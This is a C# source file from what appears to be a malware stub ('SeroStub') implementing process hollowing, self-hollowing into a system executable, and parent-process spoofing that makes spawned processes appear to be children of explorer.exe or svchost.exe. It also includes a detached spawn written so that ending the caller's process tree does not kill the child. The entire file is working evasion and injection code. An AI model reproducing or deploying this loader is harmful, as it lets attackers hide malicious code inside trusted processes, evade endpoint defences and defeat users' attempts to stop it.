using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

/// <summary>
/// 64-bit process hollowing using NtCreateSection / NtMapViewOfSection
/// with PPID spoofing via STARTUPINFOEXW + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
/// Requires NativeAOT compilation (PublishAot=true) to produce a real native PE.
/// </summary>
internal static class ProcessHollowing
{
    // ── Constants ───────────────────────────────────
    private const uint CREATE_SUSPENDED = 0x00000004;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const uint CONTEXT_FULL = 0x10000B;
    private const uint SECTION_MAP_READ = 0x0004;
    private const uint SECTION_MAP_EXECUTE = 0x0008;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint SEC_IMAGE = 0x1000000;
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_EXECUTE = 0x20000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint OPEN_EXISTING = 3;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint PAGE_READONLY = 0x02;
    private const uint FILE_MAP_READ = 0x0004;
    private const uint PROCESS_CREATE_PROCESS = 0x0080;

    // x64 CONTEXT offsets
    private const int CTX_SIZE = 1232;
    private const int CTX_FLAGS = 0x30;
    private const int CTX_RDX = 0x88;
    private const int CTX_RIP = 0xF8;

    // PPID spoofing
    private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;


    // Environment variable marker for detection
    public const string HOLLOW_ENV_KEY = "__SERO_H__";
    private const string HOLLOW_ENV_VAL = "1";

    /// <summary>Returns true if the current process was started via process hollowing.</summary>
    public static bool IsHollowedInstance()
    {
        return Environment.GetEnvironmentVariable(HOLLOW_ENV_KEY) == HOLLOW_ENV_VAL;
    }

    // ── Structs ─────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFOW
    {
        public int cb;
        public nint lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public nint lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFOEXW
    {
        public STARTUPINFOW StartupInfo;
        public nint lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public nint hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    // ── P/Invoke ────────────────────────────────────

    [DllImport("ntdll.dll")]
    private static extern int NtCreateSection(
        out nint SectionHandle, uint DesiredAccess, nint ObjectAttributes,
        nint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, nint FileHandle);

    [DllImport("ntdll.dll")]
    private static extern int NtMapViewOfSection(
        nint SectionHandle, nint ProcessHandle, ref nint BaseAddress,
        nuint ZeroBits, nuint CommitSize, nint SectionOffset,
        ref nuint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll")]
    private static extern int NtUnmapViewOfSection(nint ProcessHandle, nint BaseAddress);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(
        string? lpApplicationName, nint lpCommandLine, nint lpProcessAttributes,
        nint lpThreadAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
        uint dwCreationFlags, nint lpEnvironment, nint lpCurrentDirectory,
        ref STARTUPINFOEXW lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetThreadContext(nint hThread, nint lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetThreadContext(nint hThread, nint lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool ReadProcessMemory(
        nint hProcess, nint lpBaseAddress, out long lpBuffer, nuint nSize, out nuint lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool WriteProcessMemory(
        nint hProcess, nint lpBaseAddress, ref long lpBuffer, nuint nSize, out nuint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(nint hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(nint hProcess, uint uExitCode);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(nint hObject);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern nint CreateFileW(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        nint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, nint hTemplateFile);

    [DllImport("kernel32.dll")]
    private static extern nint GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern nint CreateFileMappingW(
        nint hFile, nint lpFileMappingAttributes, uint flProtect,
        uint dwMaximumSizeHigh, uint dwMaximumSizeLow, nint lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern nint MapViewOfFile(
        nint hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh,
        uint dwFileOffsetLow, nuint dwNumberOfBytesToMap);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnmapViewOfFile(nint lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern nint OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(nint lpAttributeList, int dwAttributeCount, int dwFlags, ref nint lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(
        nint lpAttributeList, uint dwFlags, nint attribute, nint lpValue,
        nint cbSize, nint lpPreviousValue, nint lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern void DeleteProcThreadAttributeList(nint lpAttributeList);

    // ── Detached Spawn (PPID-spoofed, breaks process tree) ──────────

    private const uint CREATE_NO_WINDOW        = 0x08000000;
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;

    /// <summary>
    /// Spawns exePath with Explorer as parent (PPID spoof) and an explicit env block.
    /// The spawned process is NOT in our process tree — "End Process Tree" on us won't kill it.
    /// envOverrides: null value = remove key, non-null = set key.
    /// Returns the new PID, or -1 on failure.
    /// </summary>
    public static int SpawnDetached(string exePath, IReadOnlyDictionary<string, string?> envOverrides)
    {
        nint envBlock = BuildEnvBlock(envOverrides);
        nint hParent  = GetSpoofParentHandle();
        nint attrList = 0, hParentPtr = 0;
        var  siEx = new STARTUPINFOEXW();
        siEx.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEXW>();
        uint flags = CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT;

        try
        {
            if (hParent != 0)
            {
                nint attrSize = 0;
                InitializeProcThreadAttributeList(0, 1, 0, ref attrSize);
                attrList = Marshal.AllocHGlobal(attrSize);
                if (InitializeProcThreadAttributeList(attrList, 1, 0, ref attrSize))
                {
                    hParentPtr = Marshal.AllocHGlobal(nint.Size);
                    Marshal.WriteIntPtr(hParentPtr, hParent);
                    if (UpdateProcThreadAttribute(attrList, 0,
                            (nint)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                            hParentPtr, nint.Size, 0, 0))
                    {
                        siEx.lpAttributeList = attrList;
                        flags |= EXTENDED_STARTUPINFO_PRESENT;
                    }
                }
            }

            bool ok = CreateProcessW(exePath, nint.Zero, 0, 0, false,
                flags, envBlock, nint.Zero, ref siEx, out var pi);
            if (!ok) { StubLog.Error($"[SpawnDetached] failed: {Marshal.GetLastWin32Error()}"); return -1; }

            int pid = pi.dwProcessId;
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return pid;
        }
        finally
        {
            if (envBlock  != 0) Marshal.FreeHGlobal(envBlock);
            if (attrList  != 0) { DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList); }
            if (hParentPtr != 0) Marshal.FreeHGlobal(hParentPtr);
            if (hParent   != 0) CloseHandle(hParent);
        }
    }

    private static nint BuildEnvBlock(IReadOnlyDictionary<string, string?> overrides)
    {
        var env = new Dictionary<string, string?>(StringComparer.OrdinalIgnoreCase);
        foreach (System.Collections.DictionaryEntry e in System.Environment.GetEnvironmentVariables())
            env[(string)e.Key] = (string?)e.Value;
        foreach (var kv in overrides)
        {
            if (kv.Value == null) env.Remove(kv.Key);
            else env[kv.Key] = kv.Value;
        }
        var sb = new System.Text.StringBuilder();
        foreach (var kv in env)
            if (kv.Value != null)
                sb.Append(kv.Key).Append('=').Append(kv.Value).Append('\0');
        sb.Append('\0');
        byte[] bytes = System.Text.Encoding.Unicode.GetBytes(sb.ToString());
        nint block = Marshal.AllocHGlobal(bytes.Length);
        Marshal.Copy(bytes, 0, block, bytes.Length);
        return block;
    }

    // ── PPID Spoofing Helper ────────────────────────

    /// <summary>Get a handle to explorer.exe for PPID spoofing.</summary>
    private static nint GetSpoofParentHandle()
    {
        try
        {
            var explorers = Process.GetProcessesByName("explorer");
            if (explorers.Length > 0)
            {
                var handle = OpenProcess(PROCESS_CREATE_PROCESS, false, explorers[0].Id);
                if (handle != 0)
                {
                    StubLog.Info($"[Hollow] PPID spoof: explorer.exe PID={explorers[0].Id}");
                    return handle;
                }
            }
        }
        catch { }

        // Fallback: try svchost
        try
        {
            var svchosts = Process.GetProcessesByName("svchost");
            if (svchosts.Length > 0)
            {
                var handle = OpenProcess(PROCESS_CREATE_PROCESS, false, svchosts[0].Id);
                if (handle != 0)
                {
                    StubLog.Info($"[Hollow] PPID spoof fallback: svchost.exe PID={svchosts[0].Id}");
                    return handle;
                }
            }
        }
        catch { }

        return 0;
    }

    // ── Self-Hollowing ──────────────────────────────

    public static int HollowSelf(string targetProcess, bool skipPpidSpoof = false)
    {
        var selfPath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(selfPath) || !File.Exists(selfPath))
        {
            StubLog.Error("[Hollow] Cannot find own executable path.");
            return -1;
        }

        if (!Path.IsPathRooted(targetProcess))
            targetProcess = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), targetProcess);

        if (!File.Exists(targetProcess))
        {
            StubLog.Error($"[Hollow] Target not found: {targetProcess}");
            return -1;
        }

        // Set env var so hollowed instance knows it was injected
        Environment.SetEnvironmentVariable(HOLLOW_ENV_KEY, HOLLOW_ENV_VAL);

        StubLog.Info($"[Hollow] Self-hollowing: {selfPath} -> {targetProcess} (skipPpidSpoof={skipPpidSpoof})");
        return Hollow(selfPath, targetProcess, skipPpidSpoof);
    }

    // ── Core Hollowing with PPID Spoofing ───────────

    public static int Hollow(string pePath, string targetProcess, bool skipPpidSpoof = false)
    {
        StubLog.Info($"[Hollow] PE={pePath} -> Target={targetProcess} (skipPpidSpoof={skipPpidSpoof})");

        // ── 1. Open PE file ─────────────────────────
        nint hPEFile = CreateFileW(pePath, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ,
            0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if (hPEFile == -1 || hPEFile == 0)
        {
            StubLog.Error($"[Hollow] CreateFile failed: {Marshal.GetLastWin32Error()}");
            return -1;
        }

        // ── 2. Map PE locally for validation ────────
        nint hMapping = CreateFileMappingW(hPEFile, 0, PAGE_READONLY, 0, 0, 0);
        if (hMapping == 0)
        {
            StubLog.Error($"[Hollow] CreateFileMapping failed: {Marshal.GetLastWin32Error()}");
            CloseHandle(hPEFile);
            return -1;
        }
        nint lpFileContent = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        CloseHandle(hMapping);
        if (lpFileContent == 0)
        {
            StubLog.Error($"[Hollow] MapViewOfFile failed: {Marshal.GetLastWin32Error()}");
            CloseHandle(hPEFile);
            return -1;
        }

        // ── 3. Validate PE ──────────────────────────
        ushort dosSignature = (ushort)Marshal.ReadInt16(lpFileContent);
        if (dosSignature != 0x5A4D)
        {
            StubLog.Error($"[Hollow] Invalid DOS signature: 0x{dosSignature:X}");
            UnmapViewOfFile(lpFileContent);
            CloseHandle(hPEFile);
            return -1;
        }

        int ntOff = Marshal.ReadInt32(lpFileContent + 0x3C);
        uint ntSignature = (uint)Marshal.ReadInt32(lpFileContent + ntOff);
        if (ntSignature != 0x00004550)
        {
            StubLog.Error($"[Hollow] Invalid NT signature: 0x{ntSignature:X}");
            UnmapViewOfFile(lpFileContent);
            CloseHandle(hPEFile);
            return -1;
        }

        uint entryPointRva = (uint)Marshal.ReadInt32(lpFileContent + ntOff + 0x28);
        uint sizeOfImage = (uint)Marshal.ReadInt32(lpFileContent + ntOff + 0x50);
        StubLog.Info($"[Hollow] PE valid. EP=0x{entryPointRva:X}, Size=0x{sizeOfImage:X}");
        UnmapViewOfFile(lpFileContent);

        // ── 4. Setup PPID spoofing (STARTUPINFOEXW) ─
        // Skip PPID spoofing when admin: spoofing to explorer.exe gives non-elevated token
        nint hParent = skipPpidSpoof ? 0 : GetSpoofParentHandle();
        nint attrList = 0;
        nint hParentPtr = 0;
        var siEx = new STARTUPINFOEXW();
        siEx.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEXW>();
        uint createFlags = CREATE_SUSPENDED;

        if (hParent != 0)
        {
            // Get attribute list size
            nint attrSize = 0;
            InitializeProcThreadAttributeList(0, 1, 0, ref attrSize);

            attrList = Marshal.AllocHGlobal(attrSize);
            if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrSize))
            {
                StubLog.Error($"[Hollow] InitializeProcThreadAttributeList failed: {Marshal.GetLastWin32Error()}");
                Marshal.FreeHGlobal(attrList);
                attrList = 0;
                CloseHandle(hParent);
                hParent = 0;
            }
            else
            {
                // Store parent handle in pinned memory
                hParentPtr = Marshal.AllocHGlobal(nint.Size);
                Marshal.WriteIntPtr(hParentPtr, hParent);

                if (!UpdateProcThreadAttribute(attrList, 0,
                    (nint)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    hParentPtr, nint.Size, 0, 0))
                {
                    StubLog.Error($"[Hollow] UpdateProcThreadAttribute failed: {Marshal.GetLastWin32Error()}");
                    DeleteProcThreadAttributeList(attrList);
                    Marshal.FreeHGlobal(attrList);
                    Marshal.FreeHGlobal(hParentPtr);
                    attrList = 0;
                    hParentPtr = 0;
                    CloseHandle(hParent);
                    hParent = 0;
                }
                else
                {
                    siEx.lpAttributeList = attrList;
                    createFlags |= EXTENDED_STARTUPINFO_PRESENT;
                    StubLog.Info("[Hollow] PPID spoofing configured.");
                }
            }
        }

        // ── 5. Create target process SUSPENDED ──────
        bool created = CreateProcessW(targetProcess, nint.Zero, 0, 0, false,
            createFlags, 0, 0, ref siEx, out var pi);

        if (!created)
        {
            StubLog.Error($"[Hollow] CreateProcess failed: {Marshal.GetLastWin32Error()}");
            if (attrList != 0) { DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList); }
            if (hParentPtr != 0) Marshal.FreeHGlobal(hParentPtr);
            if (hParent != 0) CloseHandle(hParent);
            CloseHandle(hPEFile);
            return -1;
        }
        StubLog.Info($"[Hollow] Target created suspended. PID={pi.dwProcessId}");

        nint hSection = 0, localBase = 0, remoteBase = 0, ctxPtr = 0;
        bool success = false;

        try
        {
            // ── 6. GetThreadContext → PEB address (Rdx) ──
            ctxPtr = Marshal.AllocHGlobal(CTX_SIZE);
            for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctxPtr + i, 0);
            Marshal.WriteInt32(ctxPtr + CTX_FLAGS, (int)CONTEXT_FULL);

            if (!GetThreadContext(pi.hThread, ctxPtr))
            {
                StubLog.Error($"[Hollow] GetThreadContext failed: {Marshal.GetLastWin32Error()}");
                return -1;
            }

            long rdx = Marshal.ReadInt64(ctxPtr + CTX_RDX);
            StubLog.Info($"[Hollow] PEB (Rdx) = 0x{rdx:X}");

            // Read original image base from PEB+0x10
            if (!ReadProcessMemory(pi.hProcess, (nint)(rdx + 0x10), out long origBase, 8, out _))
            {
                StubLog.Error($"[Hollow] ReadProcessMemory PEB failed: {Marshal.GetLastWin32Error()}");
                return -1;
            }

            // ── 7. NtCreateSection (SEC_IMAGE) from PE file ──
            int status = NtCreateSection(out hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
                0, 0, PAGE_EXECUTE_READ, SEC_IMAGE, hPEFile);
            CloseHandle(hPEFile);
            hPEFile = 0;

            if (status < 0)
            {
                StubLog.Error($"[Hollow] NtCreateSection failed: 0x{status:X8}");
                return -1;
            }

            // ── 8. Map locally ──────────────────────────
            nuint viewSize = 0;
            status = NtMapViewOfSection(hSection, GetCurrentProcess(), ref localBase,
                0, 0, 0, ref viewSize, 2, 0, PAGE_EXECUTE_READ);
            if (status < 0)
            {
                StubLog.Error($"[Hollow] MapLocal failed: 0x{status:X8}");
                return -1;
            }

            // ── 9. Map into target process ──────────────
            viewSize = 0;
            status = NtMapViewOfSection(hSection, pi.hProcess, ref remoteBase,
                0, 0, 0, ref viewSize, 2, 0, PAGE_EXECUTE_READ);
            if (status < 0)
            {
                StubLog.Error($"[Hollow] MapRemote failed: 0x{status:X8}");
                return -1;
            }
            StubLog.Info($"[Hollow] Mapped in target at 0x{remoteBase:X}");

            // ── 10. GetThreadContext again ──────────────
            for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctxPtr + i, 0);
            Marshal.WriteInt32(ctxPtr + CTX_FLAGS, (int)CONTEXT_FULL);

            if (!GetThreadContext(pi.hThread, ctxPtr))
            {
                StubLog.Error($"[Hollow] GetThreadContext (2) failed: {Marshal.GetLastWin32Error()}");
                return -1;
            }

            // ── 11. Update PEB.ImageBaseAddress ─────────
            long newBase = remoteBase;
            if (!WriteProcessMemory(pi.hProcess, (nint)(Marshal.ReadInt64(ctxPtr + CTX_RDX) + 0x10),
                ref newBase, 8, out _))
            {
                StubLog.Error($"[Hollow] PEB update failed: {Marshal.GetLastWin32Error()}");
                return -1;
            }

            // ── 12. Set new RIP = remote base + entry point ──
            long newRip = (long)remoteBase + entryPointRva;
            Marshal.WriteInt64(ctxPtr + CTX_RIP, newRip);

            if (!SetThreadContext(pi.hThread, ctxPtr))
            {
                StubLog.Error($"[Hollow] SetThreadContext failed: {Marshal.GetLastWin32Error()}");
                return -1;
            }

            // ── 13. Resume thread ───────────────────────
            ResumeThread(pi.hThread);
            StubLog.Info($"[Hollow] Injection complete! PID={pi.dwProcessId} (PPID spoofed={hParent != 0})");
            success = true;
            return pi.dwProcessId;
        }
        finally
        {
            if (localBase != 0) NtUnmapViewOfSection(GetCurrentProcess(), localBase);
            if (hSection != 0) CloseHandle(hSection);
            if (hPEFile != 0) CloseHandle(hPEFile);
            if (ctxPtr != 0) Marshal.FreeHGlobal(ctxPtr);

            if (!success)
            {
                if (remoteBase != 0) NtUnmapViewOfSection(pi.hProcess, remoteBase);
                TerminateProcess(pi.hProcess, 0);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            // Cleanup PPID spoofing resources
            if (attrList != 0) { DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList); }
            if (hParentPtr != 0) Marshal.FreeHGlobal(hParentPtr);
            if (hParent != 0) CloseHandle(hParent);
        }
    }
}
